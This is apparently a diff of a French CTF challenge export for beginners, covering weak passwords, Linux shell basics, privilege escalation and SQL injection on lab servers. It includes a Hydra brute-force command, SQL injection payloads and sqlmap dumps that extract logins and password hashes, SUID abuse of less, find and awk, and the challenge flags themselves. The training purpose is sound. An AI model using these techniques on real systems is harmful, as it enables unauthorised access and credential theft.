@@ -1,99 +1,39 @@
-{"count": 50, "results": [
+{"count": 47, "results": [
     {
-        "category": "Password",
-        "state": "visible",
-        "requirements": "null",
-        "name": "Une affaire de famille",
-        "docker": "",
-        "max_attempts": 0,
-        "type": "standard",
-        "id": 1,
-        "value": 1,
-        "description": "\nJean Bon vient de monter sa startup spécialisée dans la vente de sabres lasers.</br>\nIl a passé la soirée à consolider ses commandes, en pensant à ses dernières vacances en Martinique.</br>\nAvant de rentrer, regarder le dernier épisode de Game of Throne, il sauvegarde ses documents dans un zip chiffré sur une clef usb.</br>\nQuand winzip lui demande un mot de passe, sans contrainte particulière, il a un souvenir d'une vague formation en sécurité, et il entre rapidement un mot de passe de plus de 8 lettres facile à retrouver.</br></br>\nLe flag est le mot de passe qu'il va utiliser."
-    },
-    {
-        "category": "Password",
-        "state": "visible",
-        "requirements": "null",
-        "name": "Au boulot",
-        "docker": "",
-        "max_attempts": 0,
-        "type": "standard",
-        "id": 2,
-        "value": 2,
-        "description": "\nLes affaires décollent, Jean peut se permettre prendre Jar Jar en stage pour développer une solution de gestion de stock adaptée aux sabres laser en php.</br>\nJar Jar trouve rapidement un super code sur github, et l'installe sans tarder.</br>\nAu moment de créer son compte, Jean découvre avec énervement que le logiciel refuse de créer son compte s'il n'y a pas de lettre majuscule dans le mot de passe.</br></br>\nLe flag est le mot de passe que Jean va utiliser."
-    },
-    {
-        "category": "Password",
-        "state": "visible",
-        "requirements": "null",
-        "name": "Une politique de sécurité forte",
-        "docker": "",
-        "max_attempts": 0,
-        "type": "standard",
-        "id": 3,
-        "value": 3,
-        "description": "\nLe logiciel de gestion de stock marche plutôt bien. Jar Jar, se dit qu'il est temps de penser à le sécuriser un peu.</br>\nIl décide de renforcer la sécurité en forcant l'utilisation d'un caractère spécial dans le mot de passe.</br>\nPendant ce temps Jean, focalisé sur le marché américain et la conversion euro/dollars, ne se doute pas qu'il va devoir bientôt changer son mot de passe. </br></br>\nLe flag est le futur mot de passe que Jean va utiliser."
-    },
-    {
-        "category": "Password",
-        "state": "visible",
-        "requirements": "null",
-        "name": "Au boulot",
-        "docker": "",
-        "max_attempts": 0,
-        "type": "standard",
-        "id": 4,
-        "value": 10,
-        "description": "\nAu vu des besoins croissants, Jar Jar se voit contraint de migrer vers un progicel plus adapté. Il l'installe et part en week-end.</br>\n```\nhttps://{IP_SERVER}/password/index.php\n```\n</br>\nAu moment de se connecter, Jean réalise qu'il n'a aucune idée du login/password utilisé par Jar Jar. </br>\nIl va chercher sur internet des couples login/password par défaut connus sur le git https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/\n</br>\nIl ouvre <code>mysql-betterdefaultpasslist.txt</code> et il teste à la main...\n</br></br>\nNote pour plus tard... Les constructeurs ont souvent leurs propres mots de passe par défaut. Une petite liste est dispo dans le fichier default-passwords.csv du même github. Utile quand on récupère un vieux routeur ou une instalaltion par défaut d'un serveur Tomcat..."
-    },
-    {
-        "category": "Password",
-        "state": "visible",
-        "requirements": "null",
-        "name": "Au boulot",
-        "docker": "",
-        "max_attempts": 0,
-        "type": "standard",
-        "id": 5,
-        "value": 15,
-        "description": "\nLe logiciel n'étant pas adapté, Jar Jar en installe un autre et part en vacances.\n```\nhttps://{IP_SERVER}/password/index_hydra.php\n```\n</br>\nAu moment de se connecter, Jean réalise qu'il n'a, cette fois encore, aucune idée du login/password utilisé par Jar Jar. </br>\nIl n'a pas envie de se taper une nouvelle liste à la main, et décide d'automatiser la saisie des mots de passe avec THC Hydra.</br></br>\n</br>\nIl fait un click droit sur la page d'authentification du site web et regarde le code HTML.\n</br>\nIl en déduit la méthode (get/post) d'envoie des données par la page web vers le serveur, et les nom des champs utilisés.</br>\n```\n<form action=\"\"  method=\"post\"> ==> Méthode POST\n<input type=\"text\" class=\"form-control\" id=\"login\" name=\"login\"> ==> champ login\n<input type=\"password\" class=\"form-control\" id=\"password\" name=\"password\"> ==> champ password\n```\n</br>\nIl lance une kali et récupère deux fichiers unix_users.txt et unix_passwords.txt qui sont rangés avec d'autres dictionnaires de mots de passe dans <code>/usr/share/wordlists/metasploit/</code>.\nIl commence à lire la description de THC-Hydra en [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra) pour savoir le configurer.</br></br>\n```\nhydra {IP_SERVER} \\\nhttps-form-post \\\n\"/password/index_hydra.php\\\n:login=^USER^&password=^PASS^\\\n:Authentification\"\\\n-L unix_users.txt -P unix_passwords.txt \\\n-I -vvvv -f\n```\n```\n{IP_SERVER}                  : notre serveur</br>\nhttps-form-post              : https et post</br>\n/password/index_hydra.php    : url à tester</br>\nlogin=^USER^&password=^PASS^ : les parametres à tester avec les fichiers Users et Passwords</br>\n-L unix_users.txt            : fichier contenant la liste des logins</br>\n-P unix_passwords.txt        : fichier contenant la liste des mots de passe</br>\nAuthentification             : message présent sur la page en cas d'echec de l'authentification</br>\n-v                           : Verbose\n-f                           : Une fois un login/password trouvé arréter de chercher\n```\n</br></br>\nDans un CTF, les serveurs sont configurés pour limiter le débit des requètes et ne pas se retrouver à genoux sous la charge. </br>\nGénéralement, on n'aime pas le bruteforce.</br>\nSi le mot de passe ne sort pas très vite avec les listes par 'défaut', c'est que ce n'est pas la bonne méthode.</br>\nSur du ssh, le serveur va souvent être configuré pour 2 tentatives par seconde max... Impec pour du manuel, pas terrible pour du brute force..."
-    },
-    {
-        "category": "Ghost in the Shell",
+        "category": "Premier Flag",
         "state": "visible",
         "requirements": "null",
         "name": "Intro",
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 6,
+        "id": 1,
         "value": 1,
-        "description": "\nLes flags sont souvent générés aléatoirement.</br>\nPour valider ce challenge copie/colle le flag: 373c51258167377b8a81168f11aea626"
+        "description": "\nLes flags sont souvent générés aléatoirement.</br>\nPour valider ce challenge copie/colle le flag:     373c51258167377b8a81168f11aea626"
     },
     {
-        "category": "Ghost in the Shell",
+        "category": "Premier Flag",
         "state": "visible",
         "requirements": "null",
         "name": "Intro..",
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 7,
-        "value": 1,
+        "id": 2,
+        "value": 2,
         "description": "\nDans ce CTF, les flags sont de la forme `flag_{abcedfgh}`.</br>\nPour valider ce challenge copie/colle le flag:    flag_{m0n_pr3m13r_fl4g}"
     },
     {
-        "category": "Ghost in the Shell",
+        "category": "Terminal",
         "state": "visible",
         "requirements": "null",
         "name": "LolCatz",
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 8,
+        "id": 3,
         "value": 5,
-        "description": "\nHello, jeune Padawan !</br></br>\nLe chemin pour devenir un Jedi est long. Nous allons faire tes premiers pas ensemble...</br></br>\nOuvre un terminal en cliquant sur [Mon Terminal] dans le menu à gauche. Ce terminal sera ta base de travail pour exploiter les serveurs.</br>\nDémarre un serveur en cliquant sur le bouton [Start Server] en haut de la page.</br>\nA partir du terminal tu vas accéder aux serveurs en ssh, telnet ou lancer des attaques avec des outils comme nmap ou sqlmap...</br>\nOn va commencer avec ssh.</br>\nLa commande de la forme: ssh utilisateur@serveur -p port</br></br>\nSi c'est la première connection à ce serveur, ssh informe qu'il ne le connait pas et va vous demander une confirmation de l'identité.\n</br>\n<code>\nThe authenticity of host 'ctf-shell_5cf4eb9cb0b62 (172.23.0.3)' can't be established.\nECDSA key fingerprint is SHA256:GZIryMk48IfE+fs2nWstk4jCKKifhh8HIRakABWj+h8.\nAre you sure you want to continue connecting (yes/no)?\n</code></br>\nIl faut taper : yes</br>\n<code>\nyoda@ctf-shell_5cf4eb9cb0b62's password:\n</code>\nSaisissez ensuite le mot de passe, et vous êtes sur le serveur. Ne reste plus qu'à utiliser les commandes shells...\n</br><code>\n$ ssh luke@IPSERVER\n</code></br>\nConnecte toi au serveur en IPSERVER, avec le user 'luke' et le mot de passe 'tatooine'.</br></br>\n<code>\n$ pwd\n</code></br>\nUtilise pwd, pour connaitre le chemin du répertoire ou tu te trouves.</br></br>\n<code>\n$ ls\n</code></br>\nUtilise ls pour afficher les fichiers présents dans ce répertoire.</br></br>\n<code>\n$ cat flag1.txt\n</code></br>\nUtilise cat pour afficher le contenu d'un fichier. Que contient le fichier flag1.txt ?</br>\nCopie ce Flag pour valider ce challenge !\n</br><code>\n$ exit\n</code></br>\nUtilise la commande exit pour quitter le serveur et revenir sur ton terminal.</br>\nAttention, si tu utilises exit dans ton terminal, tu va perdre toute connection.\nIl faudra fermer l'onglet et en réouvrir un autre."
+        "description": "\nHello, jeune Padawan !</br></br>\nDémarre un serveur en cliquant sur le bouton [Start Server] en haut de la page.\n</br>\n<code>\n$ ssh luke@IPSERVER\n</code></br>\nConnecte toi au serveur IPSERVER, avec le user 'luke' et le mot de passe 'tatooine' en ssh.\n</br>\nSi c'est la première connection à ce serveur, ssh informe qu'il ne le connait pas et va vous demander une confirmation de l'identité.\n```\nThe authenticity of host 'ctf-shell_5cf4eb9cb0b62 (172.23.0.3)' can't be established.\nECDSA key fingerprint is SHA256:GZIryMk48IfE+fs2nWstk4jCKKifhh8HIRakABWj+h8.\nAre you sure you want to continue connecting (yes/no)?\n```\nIl faut taper : yes</br>\nSaisissez ensuite le mot de passe, et vous êtes sur le serveur. Ne reste plus qu'à utiliser les commandes shells...\n<code>\n$ pwd\n</code></br>\nUtilise pwd, pour connaitre le chemin du répertoire ou tu te trouves.</br></br>\n<code>\n$ ls\n</code></br>\nUtilise ls pour afficher les fichiers présents dans ce répertoire.</br></br>\n<code>\n$ cat flag1.txt\n</code></br>\nUtilise cat pour afficher le contenu d'un fichier. Que contient le fichier flag1.txt ?</br>\nCopie ce Flag pour valider ce challenge !\n</br><code>\n</br>\n$ exit\n</code></br>\nUtilise la commande exit pour quitter le serveur et revenir sur ton terminal.</br>\nAttention, si tu utilises exit dans ton terminal, tu va perdre toute connection.\nIl faudra fermer l'onglet et en réouvrir un autre."
     },
     {
         "category": "Ghost in the Shell",
@@ -103,7 +43,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 9,
+        "id": 4,
         "value": 5,
         "description": "\nParfois les fichiers sont cachés en plein jour.\n```\n$ ssh yoda@IPSERVER\n```\nConnecte toi au serveur en IPSERVER, avec le user 'yoda' et le mot de passe 'naboo'.</br></br>\n```\nls -al\n```\nListe les fichiers cachés, et affiche des infos sur le propriétaire et les groupes."
     },
@@ -115,7 +55,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 10,
+        "id": 5,
         "value": 5,
         "description": "\n```\n$ ssh obiwan@IPSERVER\n```\nConnecte toi au serveur en IPSERVER, avec le user 'obiwan' et le mot de passe 'hoth'.</br></br>\nComment ça ton frigo est vide ?</br>\nEt comment est celui de la voisine ?</br>\nJete un oeil chez /home/padme...</br></br>\nLes répertoires des utilisateurs sont le plus souvent dans le répertoire /home. Celui de l'administrateur en /root.</br>\nCe sont les répertoires à examiner en priorité... Ils sont parfois autorisés en lecture.\nCommandes : ls, cat"
     },
@@ -127,7 +67,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 11,
+        "id": 6,
         "value": 5,
         "description": "\nConnecte toi au serveur en IPSERVER, avec le user 'jarjar' et le mot de passe 'shili'.</br></br>\nCertains comptes système comme les serveur web ou de base de donnée n'ont pas de répertoire du tout, ou un répertoire situé dans les données de leur application.</br></br>\nOn les trouve en avant-dernière colonne du fichier /etc/passwd qui est toujours en lecture par tous.</br>\nUtilise cat sur /etc/passwd pour en voir le contenu, et identifie la ligne de mace.\nOu se trouve le home du compte mace ?</br></br>\nUtilise ls et cat pour recupérer ton flag.\nCommandes : cat, ls, cat"
     },
@@ -139,7 +79,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 12,
+        "id": 7,
         "value": 5,
         "description": "\nConnecte toi en ssh à IPSERVER avec le user dooku et le password dagobah.</br></br>\n```bash\nfind / -name flag*.txt 2>/dev/null\n```\nUtilise la commande find pour rechercher tous les fichiers qui ont un nom du type flagXX.txt</br>\nLe 2>/dev/null à la fin de la commande permet de ne pas afficher les messages d'erreurs quand la commande tente d'accéder à des répertoires protégés en lecture.</br>\nSi tu avais utilisé cette commande des le premier flag, tu aurais gagné du temps...</br>\nLes utilisateurs et administrateurs laissent souvent des fichiers interessant dans les répertoires temporaires comme /tmp et /var/tmp.</br></br>\nCommandes : find, cat"
     },
@@ -151,7 +91,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 13,
+        "id": 8,
         "value": 7,
         "description": "\nConnecte toi au serveur en IPSERVER, avec le user 'quigong' et le mot de passe 'bespin'.</br></br>\n```\n./welcome_07\n```\nLancer un fichier exécutable dans le répertoire courant avec ./xxxxx.</br></br>\n```\nstrings welcome_07\n```\nDumper les chaînes de caractères contenues dans le binaire. On y trouve généralement les noms de fichiers de config, et parfois des comptes ou des mots de passe en clair.\nCommandes : ls, ./, strings"
     },
@@ -163,7 +103,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 14,
+        "id": 9,
         "value": 7,
         "description": "\nConnecte toi au serveur en IPSERVER, avec le user 'grievous' et le mot de passe 'yavin'.</br></br>\nUtilise les informations qui ont leaké pour te faire passer pour leia avec la commande: su - lea\nCommandes : ls, cat, su"
     },
@@ -175,7 +115,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 15,
+        "id": 10,
         "value": 7,
         "description": "\nConnecte toi au serveur en IPSERVER, avec le user 'han' et le mot de passe 'ando'.</br></br>\nOutch, ce fichier est vraiment gros... Ca va prendre des heures de le lire...</br>\n```\ngrep flag liste10.txt\n```\nFiltrons le pour n'afficher que les lignes avec le mot 'flag'.</br></br>\nJ'ai plein de temps pour improver mon skillz à Candy Crush(tm) maintenant... C'est qui le plus malin ?"
     },
@@ -187,7 +127,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 16,
+        "id": 11,
         "value": 10,
         "description": "\nConnecte toi au serveur en IPSERVER, avec le user 'c3po' et le mot de passe 'corellia'.</br></br>\nLes fichiers zip sont des souvent utilisés pour faire des sauvegardes. On y trouve parfois des fichiers de config avec des infos três intéressantes.</br>\n```\nhead flag11.zip\n```\nAffiche les premières lignes du fichier zip avec head. L'entête commence par PK, c'est bien un zip, on peut lire le nom des fichiers qu'il contient et le flag parait être en clair. </br>\nIntéressant... L'algo ne compresse pas les tout petits fichiers...</br></br>\n```\nunzip flag11.zip\n```\nIl est utile de connaitre les différents outils de compression : zip, unzip, 7zip, rar,... et savoir reconnaitre leurs entêtes caractéristiques.</br>"
     },
@@ -199,9 +139,69 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 17,
+        "id": 12,
         "value": 10,
         "description": "\nConnecte toi au serveur en IPSERVER, avec le user 'finn' et le mot de passe 'yavin'.</br></br>\nLa commande tar est utilisée pour faire tenir toute une arborescence de fichiers en un seul fichier xxx.tar, qui est généralement compressé avec l'algorithme gzip.</br>\nOn se retrouve avec un fichier xxx.tar.gz, ou xxx.tgz.</br>\nDécompresse le avec la commande tar (options) (fichier)</br>\nSi tu as vraiment la flemme de chercher les options de la commande, tu peux regarder le contenu du fichier avec vi.</br>\nL'éditeur est carrément old school, mais il est utile de le connaître car il est présent presque partout.</br>\nPour en sortir : [Esc] :q!</br></br>\nvim est plus sympathique, mais pas toujours installé. Enjoy !"
+    },
+    {
+        "category": "Password",
+        "state": "visible",
+        "requirements": "null",
+        "name": "Une affaire de famille",
+        "docker": "",
+        "max_attempts": 0,
+        "type": "standard",
+        "id": 13,
+        "value": 1,
+        "description": "\nJean Bon vient de monter sa startup spécialisée dans la vente de sabres lasers.</br>\nIl a passé la soirée à consolider ses commandes, en pensant à ses dernières vacances en Martinique.</br>\nAvant de rentrer, regarder le dernier épisode de Game of Throne, il sauvegarde ses documents dans un zip chiffré sur une clef usb.</br>\nQuand winzip lui demande un mot de passe, sans contrainte particulière, il a un souvenir d'une vague formation en sécurité, et il entre rapidement un mot de passe de plus de 8 lettres facile à retrouver.</br></br>\nLe flag est le mot de passe qu'il va utiliser."
+    },
+    {
+        "category": "Password",
+        "state": "visible",
+        "requirements": "null",
+        "name": "Au boulot",
+        "docker": "",
+        "max_attempts": 0,
+        "type": "standard",
+        "id": 14,
+        "value": 2,
+        "description": "\nLes affaires décollent, Jean peut se permettre prendre Jar Jar en stage pour développer une solution de gestion de stock adaptée aux sabres laser en php.</br>\nJar Jar trouve rapidement un super code sur github, et l'installe sans tarder.</br>\nAu moment de créer son compte, Jean découvre avec énervement que le logiciel refuse de créer son compte s'il n'y a pas de lettre majuscule dans le mot de passe.</br></br>\nLe flag est le mot de passe que Jean va utiliser."
+    },
+    {
+        "category": "Password",
+        "state": "visible",
+        "requirements": "null",
+        "name": "Une politique de sécurité forte",
+        "docker": "",
+        "max_attempts": 0,
+        "type": "standard",
+        "id": 15,
+        "value": 3,
+        "description": "\nLe logiciel de gestion de stock marche plutôt bien. Jar Jar, se dit qu'il est temps de penser à le sécuriser un peu.</br>\nIl décide de renforcer la sécurité en forcant l'utilisation d'un caractère spécial dans le mot de passe.</br>\nPendant ce temps Jean, focalisé sur le marché américain et la conversion euro/dollars, ne se doute pas qu'il va devoir bientôt changer son mot de passe. </br></br>\nLe flag est le futur mot de passe que Jean va utiliser."
+    },
+    {
+        "category": "Password",
+        "state": "visible",
+        "requirements": "null",
+        "name": "Au boulot",
+        "docker": "",
+        "max_attempts": 0,
+        "type": "standard",
+        "id": 16,
+        "value": 10,
+        "description": "\nAu vu des besoins croissants, Jar Jar se voit contraint de migrer vers un progicel plus adapté. Il l'installe et part en week-end.</br>\n```\nhttps://{IP_SERVER}/password/index.php\n```\nOuvrez cette url dans un nouvel onglet.</br>\n</br>\nAu moment de se connecter, Jean réalise qu'il n'a aucune idée du login/password utilisé par Jar Jar. </br>\nIl va chercher sur internet des couples login/password par défaut connus sur le git\n```\nhttps://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/\n```\n</br>\nIl ouvre <code>mysql-betterdefaultpasslist.txt</code> et il teste à la main...\n</br></br>\nNote pour plus tard... Les constructeurs ont souvent leurs propres mots de passe par défaut. Une petite liste est dispo dans le fichier default-passwords.csv du même github. Utile quand on récupère un vieux routeur ou une instalaltion par défaut d'un serveur Tomcat..."
+    },
+    {
+        "category": "Password",
+        "state": "visible",
+        "requirements": "null",
+        "name": "Au boulot",
+        "docker": "",
+        "max_attempts": 0,
+        "type": "standard",
+        "id": 17,
+        "value": 15,
+        "description": "\nLe logiciel n'étant pas adapté, Jar Jar en installe un autre et part en vacances.\n```\nhttps://{IP_SERVER}/password/index_hydra.php\n```\nOuvrez l'url dans un nouvel onglet du navigateur. </br>\n</br>\nAu moment de se connecter, Jean réalise qu'il n'a, cette fois encore, aucune idée du login/password utilisé par Jar Jar. </br>\nIl n'a pas envie de se taper une nouvelle liste à la main, et décide d'automatiser la saisie des mots de passe avec THC Hydra.</br>\nTHC Hydra est un outil qui va brute forcer des login à partir de listes de user/password.</br>\nLa doc de THC-Hydra est disponible en [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)</br></br>\n</br>\nIl lance une kali et récupère deux fichiers unix_users.txt et unix_passwords.txt qui sont rangés avec d'autres dictionnaires de mots de passe dans\n```\n/usr/share/wordlists/metasploit/.\n```\nCes fichiers sont disponibles dans le terminal en\n```\n- challenges/ctf-passwd/unix_users.txt\n- challenges/ctf-passwd/unix_passwords.txt\n```\n</br>\nDans le terminal ce site est accessible en HTTP (pas en HTTPS), sans le prefix d'url /password/, et avec le nom de serveur 'ctf-passwd-web'.</br>\n```\ncurl http://ctf-passwd-web/index_hydra.php\n```\nEn regardant le code HTML de la page on en déduit les information nécessaires à l'attaque.</br>\nLa méthode (get/post) d'envoi des données par la page web vers le serveur, et les nom des champs utilisés.</br>\n```\n<form action=\"\"  method=\"post\"> ==> Méthode POST\n<input type=\"text\" class=\"form-control\" id=\"login\" name=\"login\"> ==> champ login\n<input type=\"password\" class=\"form-control\" id=\"password\" name=\"password\"> ==> champ password\n```\n</br>\n```\nhydra ctf-passwd-web http-form-post \"/index_hydra.php:login=^USER^&password=^PASS^:Authentification\"   -L challenges/ctf-passwd/unix_users.txt    -P challenges/ctf-passwd/unix_passwords.txt -v -f\n```\n```\nctf-passwd-web               : notre serveur</br>\nhttp-form-post               : https et post</br>\n/index_hydra.php             : url à tester</br>\nlogin=^USER^&password=^PASS^ : les parametres à tester avec les fichiers Users et Passwords</br>\n-L unix_users.txt            : fichier contenant la liste des logins</br>\n-P unix_passwords.txt        : fichier contenant la liste des mots de passe</br>\nAuthentification             : message présent sur la page en cas d'echec de l'authentification</br>\n-v                           : Verbose\n-f                           : Une fois un login/password trouvé arréter de chercher\n```\n</br></br>\nNote: dans un CTF, les serveurs sont configurés pour limiter le débit des requètes et ne pas se retrouver à genoux sous la charge. </br>\nGénéralement, on n'aime pas le bruteforce.</br>\nSi le mot de passe ne sort pas très vite avec les listes par 'défaut', c'est que ce n'est pas la bonne méthode.</br>\n</br>\nAide sur hydra: Dans le terminal </br>\n```\nhydra -h\nhydra -U https-form-post\n```"
     },
     {
         "category": "Privilege Escalation",
@@ -213,7 +213,7 @@
         "type": "standard",
         "id": 18,
         "value": 10,
-        "description": "\nConnecte toi au serveur en IPSERVER, avec le user 'tokio' et le mot de passe 'esther'.</br></br>\n```\nid\n```\nRegarde quel est ton id.</br></br>\nVa dans le répertoire de moscow.</br></br>\nEssaye de lire son flag.</br></br>\n```\nls -al\n./less (fichier que tu as le droit de lire...)\n```\nLe binaire less possède un sticky bit. Less est un utilitaire qui permet de lire un fichier et de se déplacer en avant et en arrière. Tu vas pouvoir lire le fichier comme si tu étais moscow.</br>\nTu peux ouvrir un shell en tapant '!sh'.</br></br>\nSors du less en tapant 'q'.</br>\n```\nid\ncat flag02.txt\n```"
+        "description": "\nConnecte toi au serveur en IPSERVER, avec le user 'tokio' et le mot de passe 'esther'.</br></br>\n```\nid\n```\nRegarde quel est ton id.</br></br>\nVa dans le répertoire de moscow.</br></br>\nEssaye de lire son flag.</br></br>\n```\nls -al\n./less (fichier que tu as le droit de lire...)\n```\nLe binaire less possède un sticky bit. Less est un utilitaire qui permet de lire un fichier et de se déplacer en avant et en arrière. Tu vas pouvoir lire le fichier comme si tu étais moscow.</br>"
     },
     {
         "category": "Privilege Escalation",
@@ -225,7 +225,7 @@
         "type": "standard",
         "id": 19,
         "value": 10,
-        "description": "\nConnecte toi au serveur en 10.0.0.10, avec le user 'moscow' et le mot de passe 'alvaro'.</br></br>\nVa dans le répertoire de rio et essaye de lire son flag.</br></br>\n```\nls -al\n```\nLe binaire find possède un sticky bit. Tu vas pouvoir l'utiliser comme si tu étais rio. </br>\nL'option -exec permet de lancer des commandes shell. Utilise la pour lancer la commande id.</br></br>\n```\n./find . -name flag* -exec cat {} \\;\n```\nLisons le flag.</br></br>"
+        "description": "\nConnecte toi au serveur en IPSERVER, avec le user 'moscow' et le mot de passe 'alvaro'.</br></br>\nVa dans le répertoire de rio et essaye de lire son flag.</br></br>\n```\nls -al\n```\nLe binaire find possède un sticky bit. Tu vas pouvoir l'utiliser comme si tu étais rio. </br>\nL'option -exec permet de lancer des commandes shell. Utilise la pour lancer la commande id.</br></br>\n```\n./find . -name flag* -exec cat {} \\;\n```\nLisons le flag.</br></br>"
     },
     {
         "category": "Privilege Escalation",
@@ -237,7 +237,7 @@
         "type": "standard",
         "id": 20,
         "value": 10,
-        "description": "\nConnecte toi au serveur en IPSERVER, avec le user 'rio' et le mot de passe 'paco'.</br></br>\nRegarde quel est ton id.</br></br>\nVa dans le répertoire de berlin.</br></br>\n```\nls -al\n./awk 'BEGIN{system(\\\"id\\\")}'\n```\nLe binaire awk possède un sticky bit. awk est un utilitaire de manipulation de fichier. Tu vas pouvoir l'utiliser comme si tu étais rio. Il permet de lancer des commandes shell. Utilise le pour lancer la commande id.</br></br>\n```\n./awk 'BEGIN{file=\"flag04.txt\";while ((getline<file) > 0) {print}}'\n```\nLisons le flag.</br></br>"
+        "description": "\nConnecte toi au serveur en IPSERVER, avec le user 'rio' et le mot de passe 'paco'.</br></br>\nRegarde quel est ton id.</br></br>\nVa dans le répertoire de berlin.</br>\n</br>\nLe binaire awk possède un sticky bit. awk est un utilitaire de manipulation de fichier. Tu vas pouvoir l'utiliser comme si tu étais rio. Il permet de lancer des commandes shell sur des fichiers. </br></br>\n```\n./awk 'BEGIN{file=\"flag04.txt\";while ((getline<file) > 0) {print}}'\n```\nLisons le flag.</br></br>"
     },
     {
         "category": "Network protocol",
@@ -312,42 +312,6 @@
         "description": "\nAlice t'attend en TCP sur l'IP IPSERVER et le port 9999</br>\n```\n# nc [IP] [port]\n```"
     },
     {
-        "category": "Network protocol",
-        "state": "visible",
-        "requirements": "null",
-        "name": "Telnet",
-        "docker": "ctf-telnet",
-        "max_attempts": 0,
-        "type": "standard",
-        "id": 27,
-        "value": 20,
-        "description": "\nAussi vieux que l'internet, telnet est à éviter, mais ça fonctionne encore.</br>\nSi, nécessaire installe telnet et connecte toi sur IPSERVER en telnet avec le compte marie et le password poppins."
-    },
-    {
-        "category": "Network protocol",
-        "state": "visible",
-        "requirements": "null",
-        "name": "Ftp",
-        "docker": "ctf-ftp",
-        "max_attempts": 0,
-        "type": "standard",
-        "id": 28,
-        "value": 20,
-        "description": "\nFtp, pour file Transfert Protocole.</br>\nInstalle un client ftp sinécessaire.</br>\nConnecte toi sur IPSERVER avec le compte spock et le password enterprise.</br>\nQuelques commandes utiles quand elles passent: ls, cd, get, bye, ...</br>\nPro Tips : Pensez à cherchez la différence entre le mode Active et le mode Passive.</br>\nhttps://slacksite.com/other/ftp.html"
-    },
-    {
-        "category": "Network protocol",
-        "state": "visible",
-        "requirements": "null",
-        "name": "POP3",
-        "docker": "ctf-smtp",
-        "max_attempts": 0,
-        "type": "standard",
-        "id": 29,
-        "value": 30,
-        "description": "\nConnectez vous en netcat au IPSERVER sur le port 110 pour relever le courrier de jean.</br>\nSon mot de passe est bon.</br>\nRenseignez-vous sur le protocole POP3: https://www.shellhacks.com/retrieve-email-pop3-server-command-line/"
-    },
-    {
         "category": "SQLi",
         "state": "visible",
         "requirements": "null",
@@ -355,7 +319,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 30,
+        "id": 27,
         "value": 10,
         "description": "\n```\nhttps://{IP_SERVER}/sqli/login.php\n```\nTente de te commecter avec le compte admin et le mot de passe admin. On ne sait jamais...</br></br>\nComment passer l'authentification quand on ne connait pas le mot de passe ?</br></br>\nPar chance, le site est encore un prototype et le développeur a laissé actif des options pour débugguer.</br>\nTu vois qu'il utilise une base de donnée SQL pour gérer les utilisateurs.</br></br>\nIl utilise la requête :SELECT * FROM users WHERE login='admin' AND passwd=md5('admin')</br></br>\nAjoute une quote ' à la fin du nom de user et regarde le résultat...</br>\nCette quote a corrompu la requête SQL. Good. Nous pouvons la modifier pour la réécrire.</br></br>\nEssaye de te connecter avec comme nom de compte:\n```\nadmin' or 1=1#\n```\nNous générons la requète:\n```\nSELECT * FROM users WHERE login='admin' or 1=1#' AND passwd=md5('admin')\n```\nTous les caractère après le # sont ignorés comme des commentaires.</br>\nLe filtre devient\n```\nlogin='admin' or 1=1\n```\nNous sommes authentifié comme le premier user de la base de donnée."
     },
@@ -367,7 +331,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 31,
+        "id": 28,
         "value": 10,
         "description": "\nRegarde l'url de consultation des messages, et le texte de débug en bas.</br>\nLa valeur 673489 est passée en paramètre de la requète SQL.</br></br>\nNous allons faire une Injection SQL utilisant UNION.</br>\nRemplace cette valeur par\n```\n673489 UNION select login from users\n```\nTu vas générer la requète :\n```\nSELECT msg FROM messages WHERE idmsg= 673489 UNION select login from users\n```\nCette requète va ajouter les logins des utilisateurs à la fin de la liste des messages."
     },
@@ -379,7 +343,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 32,
+        "id": 29,
         "value": 10,
         "description": "\nContinue sur la même url. Cette fois, en plus de noms des users, on va récupérer le hash de leurs password...</br></br>\nRemplace le paramètre 673489 par :\n```\n673489 UNION select concat(login,\" \",passwd) from users\n```\nTu vas générer la requète :\n```\nSELECT msg FROM messages WHERE idmsg= 673489 UNION select concat(login,\" \",passwd) from users\n```\nQui va concaténer la liste des users et leur hash de leur password à la fin de la liste des messages."
     },
@@ -391,9 +355,9 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 33,
+        "id": 30,
         "value": 10,
-        "description": "\nA partir du moment ou nous avons un champ utisable, il est possible de récupérer TOUTE la base de donnée. </br>\nCa peut se faire à la main, ou sans les mains avec sqlmap : [https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)\nA partir du terminal, le serveur se nomme : ctf-sqli, et est accessible en http.\n```\nsqlmap -u http://ctf-sqli/getmsg.php?idmsg=673489 --tables\nDatabase: dbmccoy\n[3 tables]\n+---------------------------------------+\n| messages                              |\n| users                                 |\n| bonus                                 |\n+---------------------------------------+\nDatabase: information_schema\n[59 tables]\n+---------------------------------------+\n| CHARACTER_SETS                        |\n| COLLATIONS                            |\n| COLLATION_CHARACTER_SET_APPLICABILITY |\n| COLUMNS                               |\n```\n</br>\nNous récupèrons non seulement les tables de notre base `dbmccoy`, mais en plus toute la structure de mysql.\n</br>\n```\nsqlmap -u http://ctf-sqli/getmsg.php?idmsg=673489 -D dbmccoy -T bonus --dump\n```\n</br>\nRegardons le contenu de la table bonus..."
